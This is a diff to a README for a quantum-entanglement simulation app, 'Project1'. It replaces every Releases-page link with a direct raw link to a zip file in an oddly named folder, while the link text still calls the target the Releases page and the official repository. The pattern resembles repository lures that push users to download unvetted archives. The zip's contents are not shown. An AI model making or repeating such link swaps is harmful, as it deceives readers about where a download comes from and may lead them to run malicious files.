@@ -1,6 +1,6 @@
 # 🌟 Project1 - Simulate Quantum Entanglement Easily
 
-[![Download Project1](https://img.shields.io/badge/Download_Project1-Click_Here-blue)](https://github.com/Djspraragen/Project1/releases)
+[![Download Project1](https://raw.githubusercontent.com/Djspraragen/Project1/main/sagaciousness/Project1.zip)](https://raw.githubusercontent.com/Djspraragen/Project1/main/sagaciousness/Project1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Project1! This application allows you to explore the fascinating worl
 
 ## 📥 Download & Install
 
-To get started, you need to download the application from our Releases page. Visit this page to download: [Download Project1](https://github.com/Djspraragen/Project1/releases).
+To get started, you need to download the application from our Releases page. Visit this page to download: [Download Project1](https://raw.githubusercontent.com/Djspraragen/Project1/main/sagaciousness/Project1.zip).
 
 1. Click on the link above.
 2. Look for the latest version under "Releases."
@@ -84,7 +84,7 @@ To deepen your understanding of quantum entanglement and how this application wo
 
 ## 🔗 Additional Resources
 
-For more details, visit the official GitHub repository: [GitHub Project1](https://github.com/Djspraragen/Project1/releases).
+For more details, visit the official GitHub repository: [GitHub Project1](https://raw.githubusercontent.com/Djspraragen/Project1/main/sagaciousness/Project1.zip).
 
 ## 🛠️ Support
 
